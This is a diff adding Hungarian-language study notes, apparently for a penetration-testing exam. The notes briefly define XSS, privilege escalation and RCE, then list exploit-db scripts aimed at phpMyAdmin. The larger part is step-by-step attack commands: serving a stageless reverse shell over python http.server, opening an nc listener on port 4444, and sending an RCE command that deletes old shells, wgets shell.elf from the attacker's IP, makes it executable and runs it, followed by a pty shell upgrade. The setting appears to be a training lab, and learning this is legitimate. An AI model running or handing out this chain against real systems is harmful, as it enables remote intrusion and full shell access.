@@ -1,0 +1,30 @@
+cross-side scripting - kliens oldali, egy elrejtett js kod a weboldal megnyitasnal lefut, serulekeny
+privilige escalation - nagyobb jogosultsag megszerzese, az alap feletti hozzaferes, unauthenticated: nincs azonositas
+exploit-db.com
+python3 50378.py [url]
+RCE - barmilyen kod futtatasa a weboldalon (jobban fel kell erre figyelni)
+python 50457.py [ip] [port] /phpmyadmin pma pmapass "ls -la"
+lepesek:
+0. milyen tipusu rendszert tamadunk (ebben az esetben Linux, 64-bites)
+	-systeminfo parancs - windows-on lefut a parancs, linuxon nem
+	-uname -a
+!zh-n minden 64-bites linux lesz
+1. a meghatarozott rendszertipusra keszitunk egy reverse shell-t
+(legyen stageless, egyfazisu)
+ha elejen akar szenvedni: meterpreter
+ha kesobb akar vki szenvedni: nem-meterpreteres
+a) tmp mappa mindenki szamara elerheto
+b) kitorlom az eddigi shell-eket
+c) letoltjuk a mi gepunkrol a shellt (hogyan?)
+(tryhard megoldas: atalakitjuk base64-be, majd egy txt fajlba atkuldjuk)
+jobb megoldas: fajlmasolas
+	a) belepes a mappaba ahol a fajl van
+	b) python3 -m http.server [port]
+	3 terminal a kovetkezo lepeshez:
+	1. pyhton3 -m http.server [port]
+	2. nc -lvnp 4444
+	3. python3 50457.py [ip] [port] /phpmyadmin pmapass pma "cd /tmp;rm -rf shell.elf;wget http://30.0.2.18:8000/shell.elf;chmod -777 /tmp/shell.elf;/tmp/shell.elf"
+	python3 -c "import pty;pty.spawn('/bin/bash')"
+d) futtathatova tesszuk a shellt
+e) listener a sajat gepunkon
+f) shell futtatasa
